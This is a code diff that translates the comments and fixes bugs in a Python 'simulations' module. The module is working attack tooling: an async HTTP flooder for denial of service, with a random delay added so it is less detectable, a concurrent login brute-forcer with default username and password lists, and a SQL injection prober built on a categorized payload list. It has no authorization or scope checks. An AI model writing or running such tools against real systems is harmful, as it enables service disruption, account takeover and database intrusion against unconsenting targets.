@@ -1,58 +1,61 @@
+# simulations.py
+
 import httpx
 import asyncio
 import time
+import random # For random delays in DDoS
 from pydantic import BaseModel, HttpUrl, Field
 from typing import Optional, List, Dict, Any
-from enum import Enum # HTTP metodları için
+from enum import Enum # For HTTP methods
 
-# --- Pydantic Modelleri ---
+# --- Pydantic Models ---
 
 class HTTPMethod(str, Enum):
     GET = "GET"
     POST = "POST"
-    # İhtiyaç duyarsanız diğer metodları ekleyebilirsiniz: PUT, DELETE, HEAD, OPTIONS
+    # Add other methods if needed: PUT, DELETE, HEAD, OPTIONS
 
 class DDoSParams(BaseModel):
     target_url: HttpUrl
     num_requests: int = Field(1000, gt=0, le=50000, description="Total number of requests to be sent")
-    concurrency: int = Field(50, gt=0, le=500, description="Number of requestors working at the same time")
+    concurrency: int = Field(50, gt=0, le=500, description="Number of concurrent request workers") # Corrected from "requestors working at the same time"
     method: HTTPMethod = Field(HTTPMethod.GET, description="HTTP method to use")
     payload: Optional[Dict[str, Any]] = Field(None, description="JSON payload for POST requests")
     headers: Optional[Dict[str, str]] = Field(None, description="Custom HTTP headers")
     timeout_seconds: float = Field(10.0, gt=0, description="Timeout for each request (seconds)")
-    # Ekstra: İstekler arası rastgele bekleme (daha az tespit edilebilir olmak için)
-    random_delay_ms_max: int = Field(0, ge=0, le=1000, description="Maximum random wait between requests (milliseconds, 0 = off)")
+    # Extra: Random delay between requests (to be less detectable)
+    random_delay_ms_max: int = Field(0, ge=0, le=1000, description="Maximum random delay between requests (milliseconds, 0 = off)")
 
 class BruteForceParams(BaseModel):
     target_url: HttpUrl
     usernames: List[str] = Field(default_factory=lambda: ["admin", "user", "testuser", "root"])
     passwords: List[str] = Field(default_factory=lambda: ["password", "123456", "admin", "qwerty", "test"])
-    # Başarıyı tespit etmek için daha esnek bir yol:
-    # Ya metin içerecek ya da belirli bir status koduna eşit olacak (VEYA ilişkisi)
+    # A more flexible way to detect success:
+    # Either it will contain text or it will be equal to a specific status code (OR relationship)
     success_text_indicator: Optional[str] = Field(None, description="Text to search for in the response on successful login (case insensitive)")
-    success_status_code: Optional[int] = Field(None, description="HTTP status code of successful login (e.g. 200, 302)")
-    # Login formundaki alan adları (hedefe göre değişebilir)
+    success_status_code: Optional[int] = Field(None, description="HTTP status code of successful login (e.g., 200, 302)")
+    # Field names in the login form (may vary depending on the target)
     username_field: str = Field("username", description="The name of the username field in the form")
     password_field: str = Field("password", description="Name of the password field in the form")
-    concurrency: int = Field(5, gt=0, le=20, description="Number of passwords to try at the same time (for each user)")
+    concurrency: int = Field(5, gt=0, le=20, description="Number of passwords to try concurrently (for each user)")
     stop_on_first_success: bool = Field(True, description="Stop all attempts on first successful login for any user")
 
 class SQLInjectionParams(BaseModel):
     target_url: HttpUrl
     param_to_inject: str = Field(description="Parameter name where the payload will be injected (URL query or POST form field)")
     method: HTTPMethod = Field(HTTPMethod.GET, description="HTTP method to use")
-    # POST istekleri için diğer form alanları (payload enjekte edilecek olan hariç)
-    other_post_data: Optional[Dict[str, str]] = Field(None, description="Other form data other than the parameter to be injected for POST")
-    base_value_for_param: Optional[str] = Field(None, description="Base value of the parameter to be injected (payload can be added around it)")
-    # Daha kapsamlı payload listesi
+    # Other form fields for POST requests (excluding the one to be injected with payload)
+    other_post_data: Optional[Dict[str, str]] = Field(None, description="Other form data for POST (excluding the parameter to be injected)")
+    base_value_for_param: Optional[str] = Field(None, description="Base value of the parameter to be injected (payload can be appended/prepended to it)")
+    # More comprehensive payload list
     payload_categories: List[str] = Field(default_factory=lambda: ["error_based", "boolean_based", "time_based_light", "union_light"])
-    # Başarıyı tespit etmek için (örn: SQL hatası, beklenmedik içerik, uzun yanıt süresi)
-    error_indicator_texts: List[str] = Field(default_factory=lambda: ["sql syntax", "unclosed quotation mark", "odbc driver error", "mysql_fetch_array()"])
-    # Boolean-based için farklı yanıtları karşılaştırma (daha karmaşık, şimdilik metin bazlı kalalım)
-    # time_based_delay_seconds: int = Field(5, description="Zaman tabanlı payload'lar için beklenen minimum gecikme (saniye)")
+    # To detect success (e.g., SQL error, unexpected content, long response time)
+    error_indicator_texts: List[str] = Field(default_factory=lambda: ["sql syntax", "unclosed quotation mark", "odbc driver error", "mysql_fetch_array()", "you have an error in your sql syntax"])
+    # Comparing different responses for Boolean-based (more complex, let's stick to text-based for now)
+    # time_based_delay_seconds: int = Field(5, description="Expected minimum delay for time-based payloads (seconds)")
 
 
-# --- SQL Injection Payload'ları (Kategorilere Ayrılmış) ---
+# --- SQL Injection Payloads (Categorized) ---
 SQLI_PAYLOADS = {
     "error_based": [
         "'", "\"", "`", "\\", "';", "\";", "`sqlmap`",
@@ -60,23 +63,23 @@ SQLI_PAYLOADS = {
         " OR 1=1 --", " OR 1=1 #", " OR 1=1/*",
         "AND 1=1", "AND 1=2"
     ],
-    "boolean_based": [ # Bunlar genellikle yanıtın değişip değişmediğine bakılarak tespit edilir
+    "boolean_based": [ # These are usually detected by checking if the response changes
         "' AND '1'='1", "' AND '1'='2",
-        "1' AND 1=(SELECT COUNT(*) FROM tablenames); --", # Tablename yerine geçerli bir tablo adı lazım
-        "' OR 1=CAST(floor(RAND()*100) AS INT) -- " # Yanıtta rastgele sayılar aramak
+        "1' AND 1=(SELECT COUNT(*) FROM tablenames); --", # A valid table name is needed instead of tablename
+        "' OR 1=CAST(floor(RAND()*100) AS INT) -- " # Search for random numbers in the response
     ],
-    "time_based_light": [ # Test sistemlerinde kısa gecikmeler
+    "time_based_light": [ # Short delays for test systems
         "' AND SLEEP(1)--", "' OR SLEEP(1)--",
         "1; SELECT PG_SLEEP(1)--", # PostgreSQL
         "1 WAITFOR DELAY '0:0:1'--", # SQL Server
-        "benchmark(2000000,MD5(1))" # MySQL (CPU yoğun)
+        "benchmark(2000000,MD5(1))" # MySQL (CPU intensive)
     ],
-    "union_light": [ # Sütun sayısını tahmin etmek gerekir, bu basit bir başlangıç
+    "union_light": [ # Need to guess the number of columns, this is a simple start
         "' UNION SELECT null--",
         "' UNION SELECT null,null--",
         "' UNION SELECT null,null,null--",
-        "' UNION SELECT 1,2,3 --", # Eğer sütunlar sayısal ise
-        "' UNION SELECT 'a','b','c' --", # Eğer sütunlar metin ise
+        "' UNION SELECT 1,2,3 --", # If columns are numeric
+        "' UNION SELECT 'a','b','c' --", # If columns are text
     ],
     "comment_out": [
         "--", "#", "/*", ";"
@@ -84,20 +87,20 @@ SQLI_PAYLOADS = {
 }
 
 
-# --- DDoS Simülasyon Fonksiyonu ---
+# --- DDoS Simulation Function ---
 async def run_ddos_simulation(params: DDoSParams) -> Dict[str, Any]:
-    print(f"Starting DDoS Simulation: Target={params.target_url}, İstek Sayısı={params.num_requests}, Synchronicity={params.concurrency}")
+    print(f"Starting DDoS Simulation: Target={params.target_url}, Requests={params.num_requests}, Concurrency={params.concurrency}") # Corrected from "İstek Sayısı" and "Synchronicity"
     successful_requests = 0
     failed_requests = 0
-    status_codes_distribution: Dict[Any, int] = {} # Hem sayısal kodlar hem de "error" için
+    status_codes_distribution: Dict[Any, int] = {} # For both numeric codes and "error"
     request_times: List[float] = []
     start_time_total = time.time()
 
     async def send_single_request(session: httpx.AsyncClient, req_id: int):
         nonlocal successful_requests, failed_requests, status_codes_distribution, request_times
         if params.random_delay_ms_max > 0:
-            delay = asyncio.sleep(random.randint(0, params.random_delay_ms_max) / 1000.0) # asyncio.sleep saniye cinsinden
-            await delay
+            delay_seconds = random.randint(0, params.random_delay_ms_max) / 1000.0 # asyncio.sleep is in seconds
+            await asyncio.sleep(delay_seconds)
 
         start_req_time = time.time()
         try:
@@ -118,32 +121,32 @@ async def run_ddos_simulation(params: DDoSParams) -> Dict[str, Any]:
             end_req_time = time.time()
             request_times.append(end_req_time - start_req_time)
             status_codes_distribution[response.status_code] = status_codes_distribution.get(response.status_code, 0) + 1
-            if 200 <= response.status_code < 400: # 3xx yönlendirmelerini de başarılı sayabiliriz
+            if 200 <= response.status_code < 400: # We can also count 3xx redirects as successful
                 successful_requests += 1
             else:
                 failed_requests += 1
         except httpx.TimeoutException:
             failed_requests +=1
             status_codes_distribution["timeout"] = status_codes_distribution.get("timeout", 0) + 1
-        except httpx.RequestError as exc:
+        except httpx.RequestError as exc: # Corrected from "exc" to not print it directly unless needed for debugging
             failed_requests += 1
             status_codes_distribution["error"] = status_codes_distribution.get("error", 0) + 1
-            # print(f"İstek {req_id} hatası: {exc}")
-        except Exception as e:
+            # print(f"Request {req_id} error: {exc}") # Uncomment for debugging
+        except Exception as e: # Corrected from "e" to not print it directly unless needed for debugging
             failed_requests += 1
             status_codes_distribution["unknown_error"] = status_codes_distribution.get("unknown_error", 0) + 1
-            # print(f"İstek {req_id} bilinmeyen hata: {e}")
+            # print(f"Request {req_id} unknown error: {e}") # Uncomment for debugging
 
 
-    # Semaphore ile eşzamanlılık kontrolü
+    # Concurrency control with Semaphore
     semaphore = asyncio.Semaphore(params.concurrency)
     async def worker(session: httpx.AsyncClient, req_id: int):
         async with semaphore:
             await send_single_request(session, req_id)
 
-    async with httpx.AsyncClient(verify=False) as client: # verify=False SSL hatalarını görmezden gelir (test için)
+    async with httpx.AsyncClient(verify=False) as client: # verify=False ignores SSL errors (for testing)
         tasks = [worker(client, i) for i in range(params.num_requests)]
-        await asyncio.gather(*tasks, return_exceptions=True) # Hatalar olsa bile devam et
+        await asyncio.gather(*tasks, return_exceptions=True) # Continue even if there are errors
 
     end_time_total = time.time()
     total_duration_seconds = end_time_total - start_time_total
@@ -166,7 +169,7 @@ async def run_ddos_simulation(params: DDoSParams) -> Dict[str, Any]:
     return result
 
 
-# --- Brute Force Simülasyon Fonksiyonu ---
+# --- Brute Force Simulation Function ---
 async def run_bruteforce_simulation(params: BruteForceParams) -> Dict[str, Any]:
     print(f"Starting Brute Force Simulation: Target={params.target_url}")
     credentials_found: List[Dict[str, str]] = []
@@ -180,9 +183,9 @@ async def run_bruteforce_simulation(params: BruteForceParams) -> Dict[str, Any]:
         try:
             response = await session.post(
                 str(params.target_url),
-                data=login_payload, # Genellikle form data olarak gönderilir
+                data=login_payload, # Usually sent as form data
                 timeout=15.0,
-                follow_redirects=True # Login sonrası yönlendirmeleri takip et
+                follow_redirects=True # Follow redirects after login
             )
             response_text_lower = response.text.lower()
 
@@ -192,19 +195,19 @@ async def run_bruteforce_simulation(params: BruteForceParams) -> Dict[str, Any]:
             if not success and params.success_text_indicator and params.success_text_indicator.lower() in response_text_lower:
                 success = True
             
-            # Başarısız giriş denemelerinde de belirli bir metin/status kodu aranabilir
-            # Örneğin, "Invalid username or password" veya 401 Unauthorized
+            # A specific text/status code can also be searched for in failed login attempts
+            # For example, "Invalid username or password" or 401 Unauthorized
 
             if success:
-                print(f" Successful Login! User: {username}, Password: {password}")
+                print(f"Successful Login! User: {username}, Password: {password}") # Corrected from "✅ "
                 credentials_found.append({"username": username, "password": password})
                 return True
-        except httpx.RequestError as exc:
-            # print(f"Login denemesi sırasında hata ({username}/{password}): {exc}")
+        except httpx.RequestError as exc: # Corrected from "exc" to not print it directly
+            # print(f"Error during login attempt ({username}/{password}): {exc}") # Uncomment for debugging
             pass
         return False
 
-    # Semaphore ile eşzamanlılık kontrolü (her kullanıcı için ayrı şifre denemeleri)
+    # Concurrency control with Semaphore (separate password attempts for each user)
     semaphore = asyncio.Semaphore(params.concurrency)
     async def worker(session: httpx.AsyncClient, username: str, password: str) -> bool:
         async with semaphore:
@@ -213,18 +216,18 @@ async def run_bruteforce_simulation(params: BruteForceParams) -> Dict[str, Any]:
     async with httpx.AsyncClient(verify=False) as client:
         for username in params.usernames:
             if simulation_halted: break
-            print(f"User '{username}' for the ciphers are being tried...")
+            print(f"Trying passwords for user '{username}'...") # Corrected from "User '{username}' for the ciphers are being tried..."
             password_tasks = [worker(client, username, password) for password in params.passwords]
             
-            # gather ile tüm taskları çalıştır, biri başarılı olursa diğerlerini iptal etme mantığı eklenebilir
-            # ancak şimdilik basit tutalım, tüm şifreleri deneyelim (eğer stop_on_first_success=False ise)
+            # Run all tasks with gather, logic to cancel others if one succeeds can be added
+            # but let's keep it simple for now, try all passwords (if stop_on_first_success=False)
             results = await asyncio.gather(*password_tasks, return_exceptions=True)
             
-            if any(res for res in results if isinstance(res, bool) and res): # Eğer bir başarılı giriş varsa
+            if any(res for res in results if isinstance(res, bool) and res): # If a successful login occurred
                 if params.stop_on_first_success:
-                    print(f"'{username}' password found for stop_on_first_success=True. Simulation is being stopped.")
+                    print(f"Password found for '{username}' and stop_on_first_success=True. Simulation is being stopped.")
                     simulation_halted = True
-                    break # Dıştaki username döngüsünü kır
+                    break # Break the outer username loop
 
     result = {
         "target_url": str(params.target_url),
@@ -236,7 +239,7 @@ async def run_bruteforce_simulation(params: BruteForceParams) -> Dict[str, Any]:
     return result
 
 
-# --- SQL Injection Simülasyon Fonksiyonu ---
+# --- SQL Injection Simulation Function ---
 async def run_sqlinjection_simulation(params: SQLInjectionParams) -> Dict[str, Any]:
     print(f"Starting SQL Injection Simulation: Target={params.target_url}, Parameter={params.param_to_inject}")
     potentially_vulnerable_findings: List[Dict[str, Any]] = []
@@ -254,21 +257,21 @@ async def run_sqlinjection_simulation(params: SQLInjectionParams) -> Dict[str, A
             "potentially_vulnerable_findings": []
         }
 
-    async with httpx.AsyncClient(verify=False, timeout=20.0) as client: # Timeout'u biraz artırabiliriz
+    async with httpx.AsyncClient(verify=False, timeout=20.0) as client: # Timeout can be increased slightly
         for payload_fragment in selected_payloads:
             total_payloads_tested += 1
-            # Payload'ı oluştur (base_value ile birleştirme)
+            # Create the payload (concatenate with base_value)
             full_payload_value = (params.base_value_for_param or "") + payload_fragment
             
-            request_params_get: Optional[Dict[str, str]] = None
+            request_params_get: Optional[Dict[str, str]] = None # Not used directly, but for clarity
             request_data_post: Optional[Dict[str, str]] = None
             final_url_str = str(params.target_url)
 
             if params.method == HTTPMethod.GET:
-                # URL'yi düzgün oluştur
+                # Construct URL properly
                 target_url_obj = httpx.URL(params.target_url)
-                query_params = dict(target_url_obj.params) # Mevcut query'leri al
-                query_params[params.param_to_inject] = full_payload_value # Hedef parametreyi payload ile değiştir
+                query_params = dict(target_url_obj.params) # Get existing queries
+                query_params[params.param_to_inject] = full_payload_value # Replace target parameter with payload
                 final_url_str = str(target_url_obj.copy_with(query=query_params))
             else: # POST
                 request_data_post = params.other_post_data.copy() if params.other_post_data else {}
@@ -285,50 +288,62 @@ async def run_sqlinjection_simulation(params: SQLInjectionParams) -> Dict[str, A
                 
                 response_text_lower = response.text.lower()
                 vulnerability_detected = False
-                detection_reason = []
+                detection_reasons = [] # Changed from detection_reason
 
                 for error_indicator in params.error_indicator_texts:
                     if error_indicator.lower() in response_text_lower:
                         vulnerability_detected = True
-                        detection_reason.append(f"Error indicator found: '{error_indicator}'")
-                        break # İlk hatayı bulunca yeterli
+                        detection_reasons.append(f"Error indicator found: '{error_indicator}'")
+                        break # Sufficient once the first error is found
 
-                # Zaman tabanlı kontrol (çok basit bir versiyon)
-                if "time_based" in params.payload_categories: # Sadece time_based payload'lar için
-                    # Bu örnekte basitçe, eğer payload'da SLEEP(N) varsa ve yanıt süresi N'den büyükse
-                    # (artı bir miktar ağ gecikmesi) zafiyetli sayılabilir.
-                    # Daha sofistike bir analiz gerekir.
-                    # Örneğin payload_fragment içinde "SLEEP(X)" gibi bir ifade varsa X'i parse et.
-                    # Şimdilik, genel bir zaman aşımı (timeout) ile veya çok uzun süren isteklerle tespit edilebilir.
-                    # Bu kısım projenin detayına göre geliştirilebilir.
-                    if response_time_seconds > (SQLI_PAYLOADS["time_based_light"][0].count("SLEEP(") * 1.0 + 2.0): # örnek bir sleep süresi + 2sn tolerans
-                         if "SLEEP" in payload_fragment.upper(): # Sadece SLEEP içeren payload'lar için
-                            vulnerability_detected = True
-                            detection_reason.append(f"Potential time-based detection: Response time {response_time_seconds:.2f}s with payload '{payload_fragment}'")
+                # Time-based check (very simple version)
+                if "time_based" in params.payload_categories: # Only for time_based payloads
+                    # In this example, simply, if the payload contains SLEEP(N) and response time is > N
+                    # (plus some network latency), it can be considered vulnerable.
+                    # A more sophisticated analysis is needed.
+                    # For example, parse X if the payload_fragment contains an expression like "SLEEP(X)".
+                    # For now, it can be detected with a general timeout or very long-running requests.
+                    # This part can be improved based on project details.
+                    
+                    # Basic attempt to extract sleep duration from payload
+                    expected_sleep_duration = 0
+                    if "sleep(" in payload_fragment.lower():
+                        try:
+                            # This is a very naive parser, real-world payloads are more complex
+                            sleep_val_str = payload_fragment.lower().split("sleep(")[1].split(")")[0].strip()
+                            if sleep_val_str.isdigit():
+                                expected_sleep_duration = int(sleep_val_str)
+                        except IndexError: # If parsing fails
+                            pass
+                    
+                    # Add a tolerance (e.g., 80% of expected + network overhead)
+                    if expected_sleep_duration > 0 and response_time_seconds >= (expected_sleep_duration * 0.8 + 0.5): # 0.5s for base latency
+                        vulnerability_detected = True
+                        detection_reasons.append(f"Potential time-based detection: Response time {response_time_seconds:.2f}s with payload '{payload_fragment}' (expected ~{expected_sleep_duration}s)")
 
 
                 if vulnerability_detected:
-                    print(f" Potential SQL Injection Found! Payload: {payload_fragment}, Cause: {detection_reason}")
+                    print(f"🎯 Potential SQL Injection Found! Payload: {payload_fragment}, Reasons: {detection_reasons}") # Corrected from "Cause"
                     potentially_vulnerable_findings.append({
                         "payload_used": payload_fragment,
                         "full_value_sent": full_payload_value,
                         "response_status": response.status_code,
                         "response_time_seconds": round(response_time_seconds, 3),
-                        "detection_reasons": detection_reason
+                        "detection_reasons": detection_reasons
                     })
 
             except httpx.TimeoutException:
-                 if "time_based" in params.payload_categories and "SLEEP" in payload_fragment.upper():
-                    print(f" Potential Time-based SQL Injection (Timeout)! Payload {payload_fragment}")
+                 if "time_based" in params.payload_categories and "sleep" in payload_fragment.lower(): # Check if it was a time-based attempt
+                    print(f"⏳ Potential Time-Based SQL Injection (Timeout)! Payload: {payload_fragment}") # Corrected from "Payload {payload_fragment}"
                     potentially_vulnerable_findings.append({
                         "payload_used": payload_fragment,
                         "full_value_sent": full_payload_value,
                         "response_status": "Timeout",
-                        "response_time_seconds": params.timeout_seconds, # httpx.AsyncClient timeout'u
+                        "response_time_seconds": client.timeout.read if client.timeout else params.timeout_seconds, # Use client's read timeout
                         "detection_reasons": ["Request timed out, potential time-based SQLi"]
                     })
-            except httpx.RequestError as exc:
-                # print(f"SQLi denemesi sırasında hata ({payload_fragment}): {exc}")
+            except httpx.RequestError as exc: # Corrected from "exc" to not print directly
+                # print(f"Error during SQLi attempt ({payload_fragment}): {exc}") # Uncomment for debugging
                 pass
 
     result = {
@@ -341,5 +356,4 @@ async def run_sqlinjection_simulation(params: SQLInjectionParams) -> Dict[str, A
     print(f"SQL Injection Simulation Completed: {result}")
     return result
 
-# Gerekirse başka simülasyon fonksiyonları buraya eklenebilir
-# Örneğin, XSS simülasyonu, Path Traversal vb.
+# Other simulation functions can be added here if needed, e.g., XSS, Path Traversal, etc.
